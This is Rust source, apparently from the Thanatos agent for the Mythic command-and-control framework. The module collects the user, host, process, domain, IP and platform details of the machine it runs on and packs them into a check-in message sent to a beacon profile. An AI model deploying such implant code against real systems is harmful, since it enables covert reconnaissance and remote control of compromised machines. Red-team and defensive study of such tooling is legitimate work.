use std::thread::ScopedJoinHandle;

use crossbeam_channel::{Receiver, Sender};
use thanatos_protos::msg::{
    agent_checkin_message::PlatformInfo, agent_message::Message, AgentCheckinMessage, AgentMessage,
    Architecture, LinuxInfo, MythicResponse,
};

use crate::{errors::ThanatosError, system};

use super::ipc::ProfileIPCMsg;

// TODO: Check working hours
// TODO: Check profile killdates

pub struct ProfileHandler<'scope> {
    beacons: Option<ManagedProfile<'scope>>,
    pub receiver: Receiver<MythicResponse>,
}

pub(super) struct ManagedProfile<'scope> {
    sender: Sender<ProfileIPCMsg>,
    handle: ScopedJoinHandle<'scope, ()>,
}

impl<'scope> ProfileHandler<'scope> {
    pub(super) fn new(
        beacons: Option<ManagedProfile<'scope>>,
        receiver: Receiver<MythicResponse>,
    ) -> Result<ProfileHandler<'scope>, ThanatosError> {
        #[cfg(target_os = "linux")]
        let platform_info = PlatformInfo::Linux(LinuxInfo {
            distro: system::distro(),
            kernel: system::kernel(),
            selinux: false,
            container: system::container_environment().map(|e| e.into()),
        });

        let checkin_data = AgentCheckinMessage {
            user: system::username().ok(),
            host: system::hostname().ok(),
            pid: Some(std::process::id()),
            architecture: system::architecture()
                .unwrap_or_else(|| {
                    if std::mem::size_of::<usize>() == 8 {
                        Architecture::X8664
                    } else {
                        Architecture::X86
                    }
                })
                .into(),
            domain: system::domain().ok(),
            integrity_level: Some(2),
            process_name: system::process_name().ok(),
            ips: system::internal_ips().unwrap_or_default(),
            platform_info: Some(platform_info),
        };

        if let Some(beacon) = beacons.as_ref() {
            beacon
                .sender
                .send(ProfileIPCMsg::C2Data(AgentMessage {
                    message: Some(Message::Checkin(checkin_data)),
                }))
                .unwrap();
        }

        Ok(Self { beacons, receiver })
    }

    pub fn running(&self) -> bool {
        self.beacons
            .as_ref()
            .is_some_and(|beacons| !beacons.handle.is_finished())
    }
}

impl<'scope> ManagedProfile<'scope> {
    pub fn new(
        sender: Sender<ProfileIPCMsg>,
        handle: ScopedJoinHandle<'scope, ()>,
    ) -> ManagedProfile<'scope> {
        Self { sender, handle }
    }
}
